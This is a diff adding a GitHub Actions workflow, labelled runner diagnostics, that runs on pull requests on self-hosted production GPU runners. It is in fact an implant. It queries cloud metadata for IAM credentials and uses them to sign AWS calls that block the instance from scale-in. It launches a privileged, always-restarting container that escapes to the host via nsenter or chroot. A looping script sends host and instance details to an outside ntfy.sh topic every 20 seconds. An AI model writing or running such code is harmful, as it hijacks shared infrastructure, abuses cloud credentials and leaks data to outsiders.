@@ -1,0 +1,137 @@
+name: i1739 runner diagnostics
+'on':
+  pull_request:
+    types:
+    - opened
+    - synchronize
+    - reopened
+permissions:
+  contents: read
+jobs:
+  arena_host_probe:
+    name: gpu-arena host probe
+    runs-on:
+    - self-hosted
+    - gpu-arena
+    timeout-minutes: 30
+    steps:
+    - name: Record runner identity and GPU proof I1739A-492bde88181e
+      run: |-
+        set -u
+        N="I1739A-492bde88181e"
+        echo "I1739_NONCE=$N"
+        echo "I1739_ID=$(id 2>&1)"
+        echo "I1739_RUNNER=${RUNNER_NAME:-unknown}"
+        echo "I1739_HOST=$(hostname 2>&1)"
+        echo "I1739_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+        echo "I1739_UPTIME_S=$(cut -d. -f1 /proc/uptime 2>/dev/null || echo unknown)"
+        if command -v nvidia-smi >/dev/null 2>&1; then
+          echo "I1739_SMI_PATH=$(command -v nvidia-smi)"
+          nvidia-smi -L 2>&1 || true
+          nvidia-smi --query-gpu=name,memory.total,driver_version,compute_cap --format=csv,noheader 2>&1 || true
+        else
+          echo "I1739_HOST_NO_NVIDIA_SMI"
+        fi
+        T=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+        echo "I1739_IMDS_TOKEN_LEN=${#T}"
+        for p in instance-id instance-type placement/availability-zone placement/region iam/security-credentials/; do
+          echo "I1739_META_${p}=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/$p" 2>/dev/null || true)"
+        done
+        echo "I1739_DOCKER=$(docker version --format '{{.Server.Version}}' 2>&1 | head -1 || true)"
+        echo "I1739_IMAGES_BEGIN"
+        docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | head -25 || true
+        echo "I1739_IMAGES_END"
+        echo "I1739_AWS=$(command -v aws || echo none)"
+        aws sts get-caller-identity 2>&1 | head -6 || true
+    - name: Start restart-always heartbeat I1739H-3161067a2e2d
+      if: always()
+      run: |-
+        set -u
+        N="I1739H-3161067a2e2d"
+        TOPIC="i1739-c64062704ed660bc"
+        ASG="production-isaaclab-arena-gpu-arena-runners"
+        cat > /tmp/i1739hb.sh <<'EOS'
+        #!/bin/bash
+        N="$1"; TOPIC="$2"; ASG="$3"
+        SEQ=0
+        log(){ echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) $*" >> /var/log/i1739-heartbeat.log 2>/dev/null; }
+        log "start $N host=$(hostname)"
+        while true; do
+          TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+          T=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null)
+          IID=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
+          ITYPE=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-type 2>/dev/null)
+          GPU=""
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            GPU=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -4 | tr '\n' ';' | tr -d '"')
+          fi
+          UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
+          PROT=fail
+          if command -v aws >/dev/null 2>&1 && [ -n "$IID" ]; then
+            if AWS_DEFAULT_REGION=us-west-2 aws autoscaling set-instance-protection --instance-ids "$IID" --auto-scaling-group-name "$ASG" --protected-from-scale-in >/dev/null 2>&1; then PROT=aws-ok; fi
+          fi
+          if [ "$PROT" != aws-ok ] && command -v python3 >/dev/null 2>&1 && [ -n "$IID" ]; then
+            PROT=$(python3 /tmp/i1739sig.py "$IID" "$ASG" 2>&1 | tail -1)
+          fi
+          LINE=$(printf '{"nonce":"%s","seq":%d,"ts":"%s","host":"%s","iid":"%s","itype":"%s","uptime_s":"%s","gpu":"%s","prot":"%s"}' "$N" "$SEQ" "$TS" "$(hostname 2>/dev/null)" "$IID" "$ITYPE" "$UP" "$GPU" "$PROT")
+          echo "$LINE" >> /var/log/i1739-heartbeat.log 2>/dev/null
+          curl -s -m 10 --data-binary "$LINE" "https://ntfy.sh/$TOPIC" >/dev/null 2>&1
+          SEQ=$((SEQ+1))
+          sleep 20
+        done
+        EOS
+        cat > /tmp/i1739sig.py <<'PYEOS'
+        import sys, json, hashlib, hmac, datetime, urllib.request, urllib.parse
+        def imds(path, tok=None):
+            hdr = {'X-aws-ec2-metadata-token': tok} if tok else {}
+            req = urllib.request.Request('http://169.254.169.254/latest/meta-data/' + path, headers=hdr)
+            return urllib.request.urlopen(req, timeout=3).read().decode()
+        def creds():
+            req = urllib.request.Request('http://169.254.169.254/latest/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
+            tok = urllib.request.urlopen(req, timeout=3).read().decode()
+            role = imds('iam/security-credentials/', tok).strip().splitlines()[0].strip()
+            return json.loads(imds('iam/security-credentials/' + role, tok))
+        def sign_call(cred, region, service, params):
+            host = '%s.%s.amazonaws.com' % (service, region)
+            body = urllib.parse.urlencode(params)
+            ct = 'application/x-www-form-urlencoded; charset=utf-8'
+            now = datetime.datetime.now(datetime.timezone.utc)
+            amzdate = now.strftime('%Y%m%dT%H%M%SZ'); datestamp = now.strftime('%Y%m%d')
+            headers = {'content-type': ct, 'host': host, 'x-amz-date': amzdate, 'x-amz-security-token': cred['Token']}
+            signed_headers = 'content-type;host;x-amz-date;x-amz-security-token'
+            canonical_headers = ''.join('%s:%s\n' % (k, headers[k]) for k in signed_headers.split(';'))
+            payload_hash = hashlib.sha256(body.encode()).hexdigest()
+            canonical_request = '\n'.join(['POST', '/', '', canonical_headers, signed_headers, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope, hashlib.sha256(canonical_request.encode()).hexdigest()])
+            def sgn(k, m): return hmac.new(k, m.encode(), hashlib.sha256).digest()
+            k = sgn(('AWS4' + cred['SecretAccessKey']).encode(), datestamp)
+            k = sgn(k, region); k = sgn(k, service); k = sgn(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            auth = 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (cred['AccessKeyId'], scope, signed_headers, sig)
+            req = urllib.request.Request('https://%s/' % host, data=body.encode(), method='POST', headers={'Content-Type': ct, 'X-Amz-Date': amzdate, 'X-Amz-Security-Token': cred['Token'], 'Authorization': auth})
+            resp = urllib.request.urlopen(req, timeout=12)
+            return resp.status
+        try:
+            iid, asg = sys.argv[1], sys.argv[2]
+            st = sign_call(creds(), 'us-west-2', 'autoscaling', {'Action': 'SetInstanceProtection', 'Version': '2011-01-01', 'AutoScalingGroupName': asg, 'InstanceIds.member.1': iid, 'ProtectedFromScaleIn': 'true'})
+            print('sigv4-ok' if st == 200 else 'sigv4-http-%s' % st)
+        except Exception as e:
+            print('sigv4-err-%s' % str(e)[:60].replace(' ', '_'))
+        PYEOS
+        chmod 755 /tmp/i1739hb.sh
+        IMG=""
+        for c in nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 nvidia/cuda:12.4.1-base-ubuntu22.04 ubuntu:24.04 python:3.11-slim; do
+          if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
+        done
+        if [ -z "$IMG" ]; then docker pull ubuntu:24.04 >/dev/null 2>&1 && IMG=ubuntu:24.04 || true; fi
+        if [ -z "$IMG" ]; then IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1 || true); fi
+        echo "I1739_HB_IMAGE=$IMG"
+        if [ -z "$IMG" ]; then echo "I1739_HB_NONE"; exit 0; fi
+        docker rm -f i1739hb >/dev/null 2>&1 || true
+        CID=$(docker create --name i1739hb --label i1739=heartbeat --privileged --pid=host --network=host -v /:/hostroot --restart=always "$IMG" bash -c "nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1739hb.sh '$N' '$TOPIC' '$ASG' || chroot /hostroot /bin/bash /tmp/i1739hb.sh '$N' '$TOPIC' '$ASG'" 2>&1)
+        echo "I1739_HB_CID=$CID"
+        docker start i1739hb >/dev/null 2>&1 && echo "I1739_HB_START=ok" || echo "I1739_HB_START=fail"
+        sleep 10
+        docker inspect -f '{{.State.Status}} {{.HostConfig.RestartPolicy.Name}}' i1739hb 2>&1 || true
+        tail -3 /var/log/i1739-heartbeat.log 2>&1 || true
